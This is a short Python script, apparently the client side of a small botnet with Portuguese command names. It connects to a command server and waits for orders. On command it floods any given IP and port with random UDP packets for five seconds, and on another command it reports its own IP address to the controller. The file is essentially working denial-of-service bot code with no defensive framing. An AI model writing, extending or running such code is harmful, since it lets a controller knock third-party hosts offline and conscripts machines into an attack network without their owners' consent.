# -*- coding: utf-8 -*-
import socket
import random
import time

serverName = "localhost"
serverPort = 11600
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect((serverName,serverPort))

def funcoes():
	while True:
		data = clientSocket.recv(1024).decode()  # receive response
		if(data == "<esganar slaves>"): break 
		elif data.find("aperriar") != -1:
			ip,port=data.split(":")
			ip=ip[10:]
			port=port.replace(">","")
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			bytes = random._urandom(1024) #random bytes
			timeout = time.time() + 5 
			sent = 0
		
			while time.time() < timeout:
				if time.time() > timeout:
					break
				sock.sendto(bytes,(ip,int(port)))
				sent = sent+1
				print("Aperriando %s com %s pacotes na porta %s" %(ip,sent,port))
			print("Aperriou... Escutando...")
		elif data == "<espiar hosts up>":
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect(("8.8.8.8", 80))
			clientSocket.send(s.getsockname()[0].encode(encoding='utf-8'))
			s.close()
		else: print('Servidor enviou: ' + data)
print("Aguardando server mandar mensagem broadcast...")
funcoes()
#clientSocket.close()